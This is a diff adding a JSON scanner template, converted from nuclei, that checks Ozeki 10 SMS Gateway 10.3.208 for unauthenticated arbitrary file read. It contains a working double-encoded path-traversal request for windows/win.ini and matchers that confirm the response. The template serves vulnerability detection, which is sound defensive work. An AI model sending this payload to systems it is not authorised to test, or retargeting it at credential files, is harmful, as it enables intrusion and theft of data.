@@ -1,0 +1,117 @@
+{
+  "id": "ozeki-10-sms-gateway",
+  "name": "Ozeki 10 SMS Gateway 10.3.208 - Arbitrary File Read",
+  "author": "r3Y3r53",
+  "severity": "HIGH",
+  "description": "An arbitrary file read vulnerability, also known as a \"path traversal\" or \"directory traversal\" vulnerability, occurs when an attacker is able to access files on a system that they shouldn\u0027t have access to. This vulnerability arises from improper input validation or insufficient access controls in an application.\n",
+  "references": [
+    "https://www.exploit-db.com/exploits/51646",
+    "https://ozeki-sms-gateway.com/attachments/702/installwindows_1689352737_OzekiSMSGateway_10.3.208.zip"
+  ],
+  "tags": [
+    "ozeki",
+    "lfi",
+    "unauth"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(content_type, \"application/octet-stream\") \u0026\u0026 contains(body, \"Mail\") \u0026\u0026 contains(body, \"files\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "ozeki-10-sms-gateway",
+    "info": {
+      "name": "Ozeki 10 SMS Gateway 10.3.208 - Arbitrary File Read",
+      "author": "r3Y3r53",
+      "severity": "high",
+      "description": "An arbitrary file read vulnerability, also known as a \"path traversal\" or \"directory traversal\" vulnerability, occurs when an attacker is able to access files on a system that they shouldn\u0027t have access to. This vulnerability arises from improper input validation or insufficient access controls in an application.\n",
+      "reference": [
+        "https://www.exploit-db.com/exploits/51646",
+        "https://ozeki-sms-gateway.com/attachments/702/installwindows_1689352737_OzekiSMSGateway_10.3.208.zip"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "ozeki,lfi,unauth"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(content_type, \"application/octet-stream\") \u0026\u0026 contains(body, \"Mail\") \u0026\u0026 contains(body, \"files\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
